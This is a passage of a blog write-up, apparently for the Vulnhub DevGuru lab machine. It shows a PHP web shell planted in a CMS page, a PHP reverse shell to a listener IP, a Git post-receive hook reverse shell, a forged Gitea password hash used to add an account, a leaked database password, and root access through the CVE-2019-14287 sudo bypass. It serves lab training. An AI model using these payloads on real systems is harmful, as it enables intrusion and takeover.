+<p><img alt="image-20201214121229631" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214121229631_ygjwtj.png"></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">onStart</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">page</span><span class="p">[</span><span class="s2">&#34;PoisonVar&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>Save it and run a command through cmd.</p>
+<p><img alt="image-20201214112322377" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214112322377_l94gtz.png"></p>
+<p>This is the response of the listed directory.</p>
+<p><img alt="image-20201214112351520" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214112351520_wjfmrq.png"></p>
+<p><img alt="image-20201214120904737" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214120904737_ulaeyr.png"></p>
+<p>Time to inject a command in cmd and get our first shell.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;192.168.0.64&#34;,1234);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</span></span></span></code></pre></div></div><p>Now just wait for the connection.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[/home/tiago]
+</span></span><span class="line"><span class="cl">└─# rlwrap nc -nlvp 1234                                                                                                                                   
+</span></span><span class="line"><span class="cl">listening on [any] 1234 .</span></span></code></pre></div></div><p><img alt="image-20201214121518763" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214121518763_i6a2rk.png"></p>
+<p>Spawning a better shell</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3.6 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span></span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /tmp
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+</span></span><span class="line"><span class="cl">chmod +x LinEnum.sh
+</span></span><span class="line"><span class="cl">./LinEnum.sh -s -k keyword -r report -e /tmp/ -t</span></span></code></pre></div></div><p>LinEnum script found some interesting backup files.</p>
+<p><img alt="image-20201214143419636" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201214143419636_wppvjk.png"></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">less app.ini.bak</span></span></code></pre></div></div><p><img alt="image-20201214144241780" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214144241780_wefohz.png"></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[database]
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">; Database to use. Either &#34;mysql&#34;, &#34;postgres&#34;, &#34;mssql&#34; or &#34;sqlite3&#34;.
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">DB_TYPE             = mysql
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">HOST                = 127.0.0.1:3306
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">NAME                = gitea
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">USER                = gitea
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">; Use PASSWD = `your password` for quoting if you use special characters in the 
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">password.
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl">PASSWD              = UfFPTF8C8jjxVF2m</span></span></code></pre></div></div><p><img alt="image-20201214150018992" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214150018992_ixz0ox.png"></p>
+<p><img alt="image-20201215122356834" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122356834_uiytre.png"></p>
+<p><img alt="image-20201215122722667" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122722667_ebbuim.png"></p>
+<p>The only way I found to reproduce such hash was takeing advantage of this opensource project, reading the code and adapting it to a simple golang program.</p>
+<p><a href="https://github.com/go-gitea/gitea/blob/master/models/user.go#L379-L397">https://github.com/go-gitea/gitea/blob/master/models/user.go#L379-L397</a></p>
+<p><img alt="image-20201215122601633" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122601633_mxvcck.png"></p>
+<p><img alt="image-20201215122226502" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201215122226502_nnsd3f.png"></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">//https://medium.com/rungo/how-to-write-a-simple-go-program-13fd104f3018
+</span></span></span><span class="line"><span class="cl"><span class="c1">//https://godoc.org/golang.org/x/crypto/pbkdf2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;crypto/sha256&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;golang.org/x/crypto/pbkdf2&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">passwd</span> <span class="p">[]</span><span class="kt">byte</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">passwd</span> <span class="p">=</span> <span class="nx">pbkdf2</span><span class="p">.</span><span class="nf">Key</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;0xtiago&#34;</span><span class="p">),</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;MaaahOeeee&#34;</span><span class="p">),</span> <span class="mi">10000</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="nx">sha256</span><span class="p">.</span><span class="nx">New</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;%x&#34;</span><span class="p">,</span><span class="nx">passwd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>Installing dependency and running the program.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ go get golang.org/x/crypto/pbkdf2
+</span></span><span class="line"><span class="cl">$ go run hash.go
+</span></span><span class="line"><span class="cl">f1eb1933069a3552722c29faeeeb1271e2e66c0eae8646201df479f90c99fa4075e8c568852a7a54b7665c3e760911706509</span></span></code></pre></div></div><p>Now just clone the table line and create a new user with the hash and salt.</p>
+<p><img alt="image-20201215122449795" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122449795_yyml1g.png"></p>
+<p><img alt="image-20201215122800138" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122800138_tnsi7u.png"></p>
+<p><img alt="image-20201215122826958" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122826958_bnzbge.png"></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ps aux <span class="p">|</span> grep gitea</span></span></code></pre></div></div><p>Gitea process is running as frank user.</p>
+<p><img alt="image-20201215123052702" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215123052702_uaqhlc.png"></p>
+<p>Create a new repository and add a reverse shell script on post-receive Git hook.</p>
+<p><img alt="image-20201215134117118" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055829/blog/image-20201215134117118_tcb6qg.png"></p>
+<p>Then i just had to clone and commit a new change like the example bellow, and received the shell back.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ git clone http://devguru.local:8585/tiago/Teste.git
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> Teste
+</span></span><span class="line"><span class="cl">$ touch test.txt
+</span></span><span class="line"><span class="cl">$ git add .
+</span></span><span class="line"><span class="cl">$ git commit -am <span class="s2">&#34;Primeiro commmit&#34;</span>
+</span></span><span class="line"><span class="cl">$ git push origin master</span></span></code></pre></div></div><p><img alt="image-20201215140141507" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055829/blog/image-20201215140141507_ktuy7u.png"></p>
+<p><img alt="image-20201215142829951" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201215142829951_vrnpsc.png"></p>
+
+<h1 id="-privilege-escalation" class="heading">🛡️ Privilege Escalation <a href="#-privilege-escalation" aria-labelledby="-privilege-escalation">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+<p>One of the first thing to do during the enumeration is check the permissions I have executing something as root, like <code>sudo -l</code>.</p>
+<p><img alt="image-20201215141736683" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055822/blog/image-20201215141736683_h2pwtn.png"></p>
+<p>I can run sqlite3 as root, but it will ask frank password for this, but we don&rsquo;t have this information. Verifying sudo version, I figured out that is vulnerable to privilege escalation, as says <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">CVE-2019-14287</a>.</p>
+<p><img alt="image-20201215143527692" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201215143527692_zgw677.png"></p>
+<p>From now on I used this to references:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></li>
+<li><a href="https://sqlite.org/cli.html">https://sqlite.org/cli.html</a></li>
+</ul>
+<p><img alt="image-20201215145115575" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201215145115575_buzrag.png"></p>
+<p>Time to become root.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/bash&#39;</span></span></code></pre></div></div><p><img alt="image-20201215145740694" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201215145740694_rlxbna.png"></p>
+
+<h1 id="-complete" class="heading">🍻 Complete <a href="#-complete" aria-labelledby="-complete">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@devguru:/root# cat msg.txt
+</span></span><span class="line"><span class="cl">cat msg.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           Congrats on rooting DevGuru!
+</span></span><span class="line"><span class="cl">  Contact me via Twitter @zayotic to give feedback!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@devguru:/root# cat root.txt
+</span></span><span class="line"><span class="cl">cat root.txt
+</span></span><span class="line"><span class="cl">96440606fb88aa7497cde5a8e68daf8f</span></span></code></pre></div></div>
+
+
+<div class="row row-cols-2 mt-5 mb-3">
+    <div class="col">
+        <a class="next" href="/blog/chillhack/">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-arrow-left "></i> --><svg class="svg-inline--fa fas fa-arrow-left " fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
+
+    
+&nbsp;ChillHack: 1 - Vulnhub 
+                </a></div>
+    <div class="col text-end">
+        <a class="previous" href="/blog/funbox_vulnhub/">
+                    Funbox: 1 - Vulnhub &nbsp;
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-arrow-right "></i> --><svg class="svg-inline--fa fas fa-arrow-right " fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M438.6 278.6c12.5-12.5 12.5-32.8 0-45.3l-160-160c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L338.8 224 32 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l306.7 0L233.4 393.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l160-160z"/></svg>
+
+    
+
+                </a></div>
+</div>
+
+
+                </div>
+                <div class="col col-md-3 col-lg-2 d-none d-md-block pt-5">
+                    
+    
+
+
+<div class="toc toc-sidebar mb-5 my-md-0 mb-lg-5 p-3 text-body-secondary sticky-top">
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+<strong class="d-block h6 my-2 pb-2">On this page:</strong>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan">Port scan</a></li>
+    <li><a href="#web-discovery">Web discovery</a>
+      <ul>
+        <li><a href="#nikto">Nikto</a></li>
+        <li><a href="#ffuf">ffuf</a></li>
+        <li><a href="#nuclei">Nuclei</a></li>
+        <li><a href="#git-dumper">Git-dumper</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+    </div>
+
+                </div>
+            </div>
+        </div>
+
+
+
+<div class="container-fluid bg-primary bg-opacity-10">
+        <div class="container-xxl px-4 px-xxl-0">
+            <div class="row row-cols-2 py-3 align-items-center">
+                <div class="col col-6">
+                    <div class="row justify-content-end p-0">
+                        <div class="col-12 col-md-8 p-0">
+                            <div class="fs-3 fw-bold">Follow me</div>
+                            <p>I work on everything coding and tweet developer memes</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col col-6 text-sm-start">
+                    <a href="https://linkedin.com/"  aria-label="LinkedIn" class="text-decoration-none link-secondary d-inline p-2">
+                            
+                                
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-linkedin fa-2x"></i> --><svg class="svg-inline--fa fab fa-linkedin fa-2x" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+    &nbsp;
+
+                            
+                        </a>
+                    <a href="https://github.com/"  aria-label="GitHub" class="text-decoration-none link-secondary d-inline p-2">
+                            
+                                
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-github fa-2x"></i> --><svg class="svg-inline--fa fab fa-github fa-2x" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+    &nbsp;
+
+                            
+                        </a>
+                    <a href="https://medium.com/"  aria-label="Medium" class="text-decoration-none link-secondary d-inline p-2">
+                            
+                                
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-medium fa-2x"></i> --><svg class="svg-inline--fa fab fa-medium fa-2x" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+
+    &nbsp;
+
+                            
+                        </a>
+                    </div>
+            </div>
+        </div>
+    </div>
+<footer class="container-fluid footer text-center p-3">
+    <div class="container-xxl text-center">
+        <small>
+            Copyright © 2024 Mark Dumay.
+            
+            
+                
+                Powered by 
+
+
+
+
+
+<a class="link-bg-footer" href="https://gethinode.com">Hinode</a>.
+            
+        </small>
+    </div>
+</footer>
+        </div>
+
+        <div id="toast-container" class="toast-container position-fixed bottom-0 end-0 p-3">
+
+
+
+
+
+
+
+<div id="toast-copied-code-message" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+    <div class="toast-header">
+        <strong class="me-auto">Hinode</strong>
+        <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+    </div>
+    <div class="toast-body">Code copied to clipboard</div>
+</div>
+</div>
+
+<script src="/js/main.bundle.min.22175aa8b875099d815002cd29142710e8ab1407c73baa5687cc32e6a636e2d5.js" integrity="sha256-IhdaqLh1CZ2BUALNKRQnEOirFAfHO6pWh8wy5qY24tU=" crossorigin="anonymous" async></script>
+    
+
+    
+
+
+
+
+</body>
+</html>
